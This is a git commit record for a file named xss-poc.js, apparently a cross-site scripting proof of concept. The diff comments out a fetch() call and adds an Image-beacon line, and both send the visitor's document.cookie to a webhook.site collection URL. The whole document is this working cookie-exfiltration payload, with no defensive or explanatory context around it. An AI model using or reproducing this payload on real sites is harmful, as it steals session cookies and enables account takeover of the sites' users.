f6c404d67838c767b92dec9d43918ec26b89bb22
HotPlugin <57496383+hotplugin0x01@users.noreply.github.com>
2022-10-27 03:29:01 +0500

    Update xss-poc.js

--- xss-poc.js
+++ xss-poc.js
@@ -1,1 +1,3 @@
-fetch("https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?cookie=" + document.cookie);
+// fetch("https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?cookie=" + document.cookie);
+
+var i=new Image;i.src="https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?cookie="+document.cookie;
